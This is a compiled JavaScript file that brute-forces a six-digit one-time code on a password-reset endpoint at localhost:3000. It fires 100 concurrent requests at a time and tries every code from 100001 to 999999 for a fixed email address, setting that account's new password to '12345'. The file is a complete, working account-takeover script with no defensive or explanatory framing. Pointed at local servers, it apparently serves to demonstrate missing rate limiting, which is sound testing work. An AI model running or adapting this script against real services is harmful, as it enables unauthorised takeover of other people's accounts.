"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
const axios = require("axios");
function sendRequest(otp) {
    return __awaiter(this, void 0, void 0, function* () {
        let data = JSON.stringify({
            email: "rajdeep@gmail.com",
            otp: otp,
            newPassword: "12345",
        });
        //   console.log('data', data)
        let config = {
            method: "post",
            maxBodyLength: Infinity,
            url: "http://localhost:3000/reset-password",
            headers: {
                "Content-Type": "application/json",
            },
            data: data,
        };
        try {
            yield axios.request(config);
        }
        catch (error) {
            console.log(error);
        }
    });
}
function main() {
    return __awaiter(this, void 0, void 0, function* () {
        for (let i = 100001; i <= 999999; i += 100) {
            console.log(i);
            const reqs = [];
            for (let j = 0; j < 100; j++) {
                reqs.push(sendRequest((i + j).toString()));
            }
            yield Promise.all(reqs);
        }
    });
}
main();
